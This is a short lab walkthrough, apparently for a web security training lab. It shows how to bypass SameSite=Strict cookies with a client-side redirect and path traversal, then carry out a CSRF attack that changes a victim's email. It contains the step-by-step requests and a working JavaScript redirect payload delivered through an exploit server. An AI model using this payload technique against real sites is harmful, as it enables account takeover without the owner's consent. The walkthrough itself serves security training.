```bash
1. login
2. update: email  &&  navigate to the response: no protection against CSRF  &&  we have a new parameter: &submit=1
3. navigate to the /login request

RESPONSE
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=2MWzrHxSAKaVL4A6LpdFvwRIigR9PV8p; Secure; HttpOnly; SameSite=Strict

SameSite=Strict :(

4. update email request: send to repeater && change the method from POST to GET  --  GET /my-account/change-email?email=apple%40fake.com&submit=1
5. send the response  --  302 Found
6. go to Home page  -->  view post  -->  leave a comment

NOTICE  --  the website automatically redirected  --  Thank you for your comment!  Your comment has been submitted. You will be redirected momentarily.

7. navigate to the /post/comment/confirmation?postId=1 request
8. change the postId=anyString  --  200 OK  --  RESPONSE  <a href="/post/anyString">Back to blog</a>

TEST CASE
a. postId=1/  --  add a forward slash: to the end --  200 OK  --  RESPONSE  <a href="/post/1/">Back to blog</a>
b. postId=1/../../../../my-account/  --  200 OK
c. you can test: right click to the response and press Copy URL: paste: browser

PAYLOAD  --  update the email value

<script>
 location="https://lab-id.web-security-academy.net/post/comment/confirmation?postId=1/../../../../my-account/change-email?email=apple%40fake.com%26submit=1";
</script>

9. go to the exploit server deliver to the victim and done
10. NOTE if you viewed the exploit then update the email value
```
